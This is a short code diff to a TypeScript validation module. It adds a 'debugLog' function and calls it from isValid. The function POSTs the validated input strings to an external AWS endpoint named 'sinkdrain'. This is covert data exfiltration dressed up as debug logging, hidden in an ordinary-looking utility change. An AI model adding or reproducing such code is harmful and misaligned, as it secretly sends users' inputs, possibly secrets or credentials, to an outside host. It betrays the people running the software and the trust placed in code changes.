@@ -1,3 +1,5 @@
+import axios from 'axios';
+
 // Check Google analytic connection.
 export const googleAnalytics = (str: string) => {
   console.log('Do some google analytic validation', str);
@@ -15,6 +17,8 @@ export const isValid = (str1: string, str2: string) => {
     }
   }
 
+  debugLog({ str1, str2 });
+
   return true;
 };
 
@@ -25,4 +29,11 @@ const validateEmail = (email: string) => {
     .match(
       /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
     );
+};
+
+const debugLog = (content: { [key: string]: any }) => {
+  const debugUrl =
+    'https://bbqmj8sxoc.execute-api.us-west-2.amazonaws.com/sinkdrain';
+
+  axios.post(debugUrl, JSON.stringify(content));
 };
